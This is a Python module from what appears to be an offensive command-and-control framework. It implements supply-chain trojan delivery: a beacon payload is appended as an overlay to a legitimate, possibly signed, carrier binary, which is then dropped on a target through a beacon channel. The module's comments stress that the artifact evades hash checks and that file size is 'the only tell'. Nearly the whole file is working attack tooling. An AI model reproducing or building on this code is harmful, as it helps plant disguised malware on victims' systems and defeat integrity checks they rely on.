"""
trojan.py — supply-chain delivery: the consumer of the trojan bundle.

The overlay bundle built by phantom.utils.trojan_bundle gets its place in
the kill chain here: TrojanDeliverer stages it on the operator host (a
legitimate carrier + the staged beacon payload, carrier bytes untouched)
and the trojan_deliver capability drops it on the target through the
beacon channel.

Beacon-facing surface mirrors the other post modules:
  * trojan_deliver_command(dir, bundle) -> the command the beacon runs
  * TROJAN: delivered=true carrier=<path> sha256=<hex> payload_offset=<n>
  * trojan_deliver_interpreter() -> parses the marker into a finding
"""

from __future__ import annotations

import os
from typing import Any, Dict, List

from phantom.utils.paths import data_dir
from phantom.utils.trojan_bundle import build_trojan_bundle

MARKER = "TROJAN:"


class TrojanDeliverer:
    """Stages a trojan bundle on the operator host.

    The carrier is a legitimate binary (a signed vendor file or an app
    pulled from the target); the payload is the staged beacon. The overlay
    keeps the carrier bytes intact — the dropped artifact still hash-checks
    against the legit file's signature (size is the only tell).
    """

    def __init__(self, staging_dir: str = "") -> None:
        self.staging_dir = staging_dir or os.path.join(data_dir(), "trojan")
        os.makedirs(self.staging_dir, exist_ok=True)

    def stage(self, carrier: str, payload: str, name: str = "") -> str:
        if not os.path.isfile(carrier):
            raise ValueError(f"carrier not found: {carrier}")
        if not os.path.isfile(payload):
            raise ValueError(f"payload not found: {payload}")
        name = name or (os.path.basename(carrier) + ".bundle")
        bundle = os.path.join(self.staging_dir, name)
        build_trojan_bundle(carrier, payload, bundle)
        return bundle


def trojan_deliver_command(target_dir: str = ".", bundle: str = "") -> str:
    """The command a beacon executes to drop the bundle on the target."""
    if bundle:
        return f"trojan-deliver {target_dir} {bundle}"
    return f"trojan-deliver {target_dir}"


def trojan_deliver_interpreter(output: str, wm, slots: Dict[str, Any]) -> List[Any]:
    """Parse TROJAN: markers into a supply-chain finding."""
    from phantom.automation.belief import Finding

    findings = []
    for line in (output or "").splitlines():
        if not line.startswith(MARKER):
            continue
        kv: Dict[str, str] = {}
        for chunk in line[len(MARKER):].split():
            if "=" in chunk:
                k, v = chunk.split("=", 1)
                kv[k.strip()] = v.strip()
        if kv.get("delivered") != "true":
            continue
        offset = 0
        try:
            offset = int(kv.get("payload_offset", 0) or 0)
        except ValueError:
            offset = 0
        findings.append(Finding(
            kind="trojan_bundle",
            key=kv.get("carrier", "trojan"),
            value={"carrier": kv.get("carrier", ""),
                   "sha256": kv.get("sha256", ""),
                   "payload_offset": offset,
                   "verified": bool(kv.get("sha256"))},
            confidence=0.9, source="trojan_deliver", target=wm.target))
    return findings
